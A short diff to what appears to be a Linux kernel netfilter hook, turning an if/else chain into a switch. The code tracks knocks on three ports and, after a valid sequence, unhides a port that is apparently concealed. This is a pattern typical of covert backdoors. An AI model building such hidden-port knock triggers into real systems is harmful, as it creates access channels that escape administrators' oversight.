@@ -137,14 +137,18 @@ static unsigned int check_dst_port(void *priv, struct sk_buff *skb, const struct
 		return NF_ACCEPT;
 	}
 	
-	if (dport == KPORT_1) {
+	switch (dport) {
+	case KPORT_1:
 		insert_port_knock(KPORT_1);
-	} else if (dport == KPORT_2) {
+		break;
+	case KPORT_2:
 		insert_port_knock(KPORT_2);
-	} else if (dport == KPORT_3) {
+		break;
+	case KPORT_3:
 		insert_port_knock(KPORT_3);
 		if (knock_ok() && is_port_hidden())
 			do_unhide_port();
+		break;
 	}
 
 	return NF_ACCEPT;
